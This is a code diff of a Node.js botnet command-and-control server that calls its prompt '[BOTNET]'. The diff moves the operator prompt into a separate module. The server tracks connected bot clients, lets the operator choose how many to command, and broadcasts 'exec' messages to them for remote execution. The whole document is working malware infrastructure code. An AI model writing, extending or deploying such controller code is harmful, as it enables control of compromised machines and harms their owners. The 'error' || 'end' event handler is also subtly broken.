@@ -1,10 +1,6 @@
 const net = require("net");
+const commands = require("./commands.js");
 require("dotenv").config({ path: "../config/.env" });
-
-const readline = require("readline").createInterface({
-	input: process.stdin,
-	output: process.stdout,
-});
 
 // Keep track of all clients
 const clients = [];
@@ -37,36 +33,14 @@ net
 		console.log(`Client ${socket.name} has connected.\n`);
 
 		setTerminalTitle();
-		prompt();
+		commands.prompt();
 
-		function prompt() {
-			readline.question("[BOTNET] ", (msg) => {
-				msg = msg.toLowerCase();
-
-				if (msg === "instances") {
-					console.log(`Instances: ${clientInstances.length}`);
-				}
-
-				if (msg.startsWith("instances")) {
-					if (msg.split(" ")[1] <= clients.length) {
-						clientInstances = [...clients];
-						clientInstances = clientInstances.slice(0, msg.split(" ")[1]);
-					}
-				}
-
-				if (msg.split(" ")[1] === "all") clientInstances = [...clients];
-
-				if (msg.startsWith("exec")) broadcast(msg);
-				return prompt();
-			});
-		}
-
-		function broadcast(message) {
+		exports.broadcast = function broadcast(message) {
 			clientInstances.forEach((client) => {
 				client.write(message);
 			});
 			process.stdout.write("\n" + message);
-		}
+		};
 
 		function clientDisconnected() {
 			clients.splice(clients.indexOf(socket), 1);
@@ -78,8 +52,8 @@ net
 		}
 
 		socket.on("data", (data) => {
-			broadcast(`[CLIENT ${socket.name}] ` + data, socket);
-			prompt();
+			exports.broadcast(`[CLIENT ${socket.name}] ` + data, socket);
+			commands.prompt();
 		});
 
 		socket.on("error" || "end", () => {
